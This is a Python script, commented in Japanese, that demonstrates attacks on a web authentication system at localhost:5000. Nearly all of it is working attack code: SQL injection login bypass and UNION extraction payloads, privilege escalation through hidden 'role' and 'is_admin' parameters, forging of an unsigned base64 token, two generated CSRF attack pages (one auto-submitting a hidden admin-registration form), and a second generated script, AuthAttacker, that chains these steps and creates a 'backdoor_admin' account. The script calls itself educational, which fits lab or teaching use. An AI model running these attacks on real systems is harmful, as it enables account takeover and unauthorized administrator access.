#!/usr/bin/env python3
"""
認証システム攻撃例のデモンストレーション
"""

import requests
import json
import base64
from urllib.parse import quote

def demonstrate_auth_attacks():
    print("=== 認証システム攻撃例のデモンストレーション ===\n")
    
    base_url = "http://localhost:5000"
    session = requests.Session()
    
    # 攻撃1: SQLインジェクションによる認証バイパス
    print("🚨 攻撃1: SQLインジェクションによる認証バイパス")
    print("-" * 50)
    
    # 管理者アカウントへのログイン試行（パスワード不明）
    sql_payload = "admin' --"
    response = session.post(f"{base_url}/login", data={
        'username': sql_payload,
        'password': 'anything'
    })
    
    print(f"SQLインジェクションペイロード: {sql_payload}")
    print(f"生成されるSQL: SELECT * FROM users WHERE username='admin' --' AND password='anything'")
    print(f"実際に実行されるSQL: SELECT * FROM users WHERE username='admin'")
    print(f"結果: パスワードチェックがバイパスされ、adminでログイン")
    
    if response.status_code == 302:  # リダイレクト = ログイン成功
        print("✅ SQLインジェクションによるログイン成功！")
        print(f"取得したCookie: {dict(response.cookies)}")
    
    # 攻撃2: UNION-based SQLインジェクションでデータ抽出
    print("\n🚨 攻撃2: UNION-based SQLインジェクションでデータ抽出")
    print("-" * 50)
    
    union_payload = "admin' UNION SELECT 1,username,password,email,1,1,1 FROM users --"
    response = session.post(f"{base_url}/login", data={
        'username': union_payload,
        'password': 'anything'
    })
    
    print(f"UNIONペイロード: {union_payload}")
    print("目的: usersテーブルのすべてのユーザー名・パスワード・メールを抽出")
    print("注意: エラーメッセージまたはレスポンスからデータベース情報が漏洩する可能性")
    
    # 攻撃3: 隠しパラメータによる権限昇格
    print("\n🚨 攻撃3: 隠しパラメータによる権限昇格")
    print("-" * 50)
    
    # 通常ユーザーのアカウントを使用
    escalation_response = session.post(f"{base_url}/login", data={
        'username': 'test1001',  # 既存の通常ユーザー
        'password': 'password123',
        'role': 'admin',  # 隠しパラメータ
        'is_admin': 'True'  # 追加の隠しパラメータ
    })
    
    print("通常ユーザー: test1001")
    print("隠しパラメータ: role=admin, is_admin=True")
    print("期待される結果: 通常ユーザーが管理者権限を取得")
    
    if escalation_response.status_code == 302:
        cookies = dict(escalation_response.cookies)
        print(f"✅ 権限昇格成功！取得したCookie: {cookies}")
        
        # 管理者ページにアクセス可能かテスト
        admin_access = session.get(f"{base_url}/admin/dashboard")
        if admin_access.status_code == 200 and "管理者ダッシュボード" in admin_access.text:
            print("🚨 管理者ダッシュボードへのアクセス成功！")
    
    # 攻撃4: JWTライクトークンの偽造
    print("\n🚨 攻撃4: JWTライクトークンの偽造")
    print("-" * 50)
    
    # まず正常なトークンを取得
    normal_login = session.post(f"{base_url}/login", data={
        'username': 'test1001',
        'password': 'password123'
    })
    
    auth_token = session.cookies.get('auth_token')
    if auth_token:
        print(f"正常なauth_token: {auth_token}")
        
        # デコード
        try:
            decoded = base64.b64decode(auth_token).decode()
            token_data = json.loads(decoded)
            print(f"デコードされたデータ: {token_data}")
            
            # 偽造トークンを作成
            forged_data = {
                'user_id': 1,  # 管理者のID
                'username': 'admin',
                'is_admin': True,
                'role': 'admin',
                'permissions': ['all']
            }
            
            forged_token = base64.b64encode(json.dumps(forged_data).encode()).decode()
            print(f"偽造されたトークン: {forged_token}")
            
            # 偽造トークンを使用してリクエスト
            session.cookies.set('auth_token', forged_token)
            forged_request = session.get(f"{base_url}/admin/dashboard")
            
            if forged_request.status_code == 200:
                print("✅ 偽造トークンによる管理者アクセス成功！")
            
        except Exception as e:
            print(f"トークン操作エラー: {e}")
    
    # 攻撃5: CSRF攻撃のデモンストレーション
    print("\n🚨 攻撃5: CSRF攻撃のデモンストレーション")
    print("-" * 50)
    
    # 悪意のあるHTMLページを作成
    csrf_html = """
<!DOCTYPE html>
<html>
<head>
    <title>無害なページ</title>
</head>
<body>
    <h1>面白い動画を見る</h1>
    <p>動画を読み込み中...</p>
    
    <!-- 隠されたCSRF攻撃フォーム -->
    <form id="maliciousForm" action="http://localhost:5000/register" method="POST" style="display:none;">
        <input type="hidden" name="username" value="hacker_csrf">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="password" value="hacked123">
        <input type="hidden" name="role" value="admin">
    </form>
    
    <script>
        // ページ読み込み後に自動でフォーム送信
        setTimeout(function() {
            document.getElementById('maliciousForm').submit();
        }, 2000);
    </script>
</body>
</html>
    """
    
    print("CSRF攻撃のHTMLファイルを作成...")
    with open('csrf_attack.html', 'w', encoding='utf-8') as f:
        f.write(csrf_html)
    
    print("✅ csrf_attack.html が作成されました")
    print("この攻撃シナリオ:")
    print("1. 被害者がこのHTMLページを開く")
    print("2. JavaScriptが自動でフォームを送信")
    print("3. 被害者のブラウザから管理者権限付きアカウントが作成される")
    print("4. CSRFトークンがないため攻撃が成功する")
    
    # 攻撃6: セッション固定化攻撃
    print("\n🚨 攻撃6: セッション固定化攻撃")
    print("-" * 50)
    
    # 攻撃者が事前にセッションIDを設定
    attacker_session = requests.Session()
    fixed_session_id = "attacker_controlled_session_123"
    
    # 被害者に固定セッションIDでログインさせる
    print(f"固定セッションID: {fixed_session_id}")
    print("攻撃手順:")
    print("1. 攻撃者が特定のセッションIDを用意")
    print("2. 被害者にそのセッションIDでログインさせる")
    print("3. 攻撃者が同じセッションIDで被害者のアカウントにアクセス")
    
    # パスワードリセット機能のCSRF
    print("\n🚨 攻撃7: パスワードリセット機能の悪用")
    print("-" * 50)
    
    password_reset_html = """
<!DOCTYPE html>
<html>
<body>
    <h1>パスワードリセット攻撃</h1>
    <form action="http://localhost:5000/auth/reset_password" method="POST">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="submit" value="無害なボタン">
    </form>
</body>
</html>
    """
    
    with open('password_reset_csrf.html', 'w', encoding='utf-8') as f:
        f.write(password_reset_html)
    
    print("✅ password_reset_csrf.html が作成されました")
    print("この攻撃により管理者のパスワードが変更される可能性があります")
    
    print("\n=== 攻撃デモンストレーション完了 ===")
    print("🚨 作成されたファイル:")
    print("- csrf_attack.html: CSRF攻撃デモ")
    print("- password_reset_csrf.html: パスワードリセット攻撃デモ")
    print("\n注意: これらは教育目的のデモンストレーションです")

def create_automated_attack_script():
    """自動化された攻撃スクリプトを作成"""
    
    attack_script = '''#!/usr/bin/env python3
"""
自動化された認証攻撃スクリプト
"""

import requests
import json
import base64
import time

class AuthAttacker:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def sql_injection_login(self):
        """SQLインジェクションによるログイン"""
        payloads = [
            "admin' --",
            "admin' OR '1'='1' --",
            "' OR 1=1 --"
        ]
        
        for payload in payloads:
            response = self.session.post(f"{self.target}/login", data={
                'username': payload,
                'password': 'anything'
            })
            
            if response.status_code == 302:
                print(f"✅ SQLiログイン成功: {payload}")
                return True
        return False
    
    def privilege_escalation(self):
        """権限昇格攻撃"""
        response = self.session.post(f"{self.target}/login", data={
            'username': 'test1001',
            'password': 'password123',
            'role': 'admin',
            'is_admin': 'True'
        })
        
        if 'is_admin' in dict(response.cookies):
            print("✅ 権限昇格成功")
            return True
        return False
    
    def forge_jwt_token(self):
        """JWTトークン偽造"""
        # 正常ログインでトークン取得
        self.session.post(f"{self.target}/login", data={
            'username': 'test1001',
            'password': 'password123'
        })
        
        # 偽造トークン作成
        forged_data = {
            'user_id': 1,
            'username': 'admin',
            'is_admin': True,
            'role': 'admin'
        }
        
        forged_token = base64.b64encode(json.dumps(forged_data).encode()).decode()
        self.session.cookies.set('auth_token', forged_token)
        
        # 管理者ページにアクセス
        response = self.session.get(f"{self.target}/admin/dashboard")
        
        if response.status_code == 200:
            print("✅ JWT偽造攻撃成功")
            return True
        return False
    
    def create_backdoor_user(self):
        """バックドアユーザー作成"""
        response = self.session.post(f"{self.target}/register", data={
            'username': 'backdoor_admin',
            'email': 'backdoor@evil.com',
            'password': 'secret123',
            'role': 'admin',
            'is_admin': 'True'
        })
        
        if "ユーザー登録が完了しました" in response.text:
            print("✅ バックドアユーザー作成成功")
            return True
        return False
    
    def run_full_attack(self):
        """完全な攻撃シーケンスを実行"""
        print("=== 自動攻撃開始 ===")
        
        print("1. SQLインジェクション攻撃...")
        self.sql_injection_login()
        
        print("2. 権限昇格攻撃...")
        self.privilege_escalation()
        
        print("3. JWT偽造攻撃...")
        self.forge_jwt_token()
        
        print("4. バックドアユーザー作成...")
        self.create_backdoor_user()
        
        print("=== 攻撃完了 ===")

if __name__ == "__main__":
    attacker = AuthAttacker("http://localhost:5000")
    attacker.run_full_attack()
'''
    
    with open('automated_auth_attack.py', 'w', encoding='utf-8') as f:
        f.write(attack_script)
    
    print("✅ automated_auth_attack.py が作成されました")

if __name__ == "__main__":
    demonstrate_auth_attacks()
    create_automated_attack_script()